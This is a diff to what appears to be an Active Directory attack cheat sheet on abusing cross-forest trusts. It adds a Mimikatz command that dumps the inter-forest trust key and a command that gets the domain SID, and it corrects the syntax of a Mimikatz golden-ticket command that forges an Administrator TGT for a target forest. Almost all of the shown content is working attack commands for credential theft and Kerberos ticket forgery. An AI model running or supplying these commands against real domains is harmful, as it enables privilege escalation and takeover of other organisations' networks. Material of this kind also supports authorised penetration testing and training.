@@ -1338,10 +1338,20 @@ Get-ADTrust -Filter *
 ```
 Get-ADGroup -Filter 'SID -ge "<TARGET FOREST SID>-1000"' -Server <TARGET FOREST>
 ```
-
+ 
+#### Get trust key
+```
+Invoke-Mimikatz -Command '"lsadump::trust /patch"'
+```
+ 
+#### Get domain SID
+```
+Get-DomainSID
+```
+ 
 #### Create a intern-forest TGT
 ```
-Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<DOMAIN SID> /rc4:<HASH OF TRUST KEY> /service:krbtgt /target:<TARGET FOREST> /sids<SID OF THE GROUP>  /ticket:<KIRBI FILE>"'
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<DOMAIN SID> /rc4:<HASH OF TRUST KEY> /service:krbtgt /target:<TARGET FOREST> /sids:<SID OF THE GROUP>  /ticket:<KIRBI FILE>"'
 ```
 
 #### Create and inject TGS
